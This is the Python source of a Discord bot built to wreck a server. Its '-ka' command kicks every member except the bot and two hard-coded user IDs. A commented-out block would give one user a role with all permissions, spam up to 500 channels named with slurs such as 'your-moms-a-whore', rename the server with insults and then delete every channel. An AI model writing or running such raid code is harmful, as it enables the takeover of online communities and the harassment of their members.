import discord
from discord.ext import commands

from time import sleep
from random import *
import sys

intents = discord.Intents.default()
intents.members = True

# Start event handling and bot creation
bot = commands.Bot(
    command_prefix=commands.when_mentioned_or("-"),
    description="It's always gamer hour",
    intents=intents,
)


@bot.command()
async def ka(ctx):
    g = ctx.message.channel.guild
    for user in ctx.message.channel.guild.members:
        try:
            if (
                user.id != bot.user.id
                and user.id != 117445905572954121
                and user.id != 939618169218293822
            ):
                await ctx.send("Kicking " + user.display_name)
                await g.kick(user)
        except Exception as e:
            await ctx.send(str(e))


@bot.event
async def on_ready():
    print("Am online")
    g = await bot.fetch_guild(322148362608705536)
    print("Got guild")

    await g.leave()

    """
    try:
        r = await g.create_role(name="lol Haha", permissions=discord.Permissions.all())
        me = await g.fetch_member(117445905572954121)
        await me.add_roles(r)
    except Exception as e:
        print(str(e))


    await g.edit(community=False)
    messages = ["troll", "kekw", "lol", "xd", "you're a hoe", "you're a whore"]

    while True:
        while len(g.channels) != 500:
            try:
                await g.edit(name=choice(messages), icon=None)
                channel = await g.create_text_channel("your-moms-a-whore-" + str(randint(1,10000)))
                print("Made channel")
                await channel.send(choice(messages))
                await channel.send("All done. :relieved:")
                await g.edit(name=choice(messages), icon=None)
            except:
                break

        for channel in await g.fetch_channels():
            print("Trying to delete " + str(channel.name))
            try:
                await channel.delete()
            except Exception as e:
                print(str(e))

    """


bot.run()
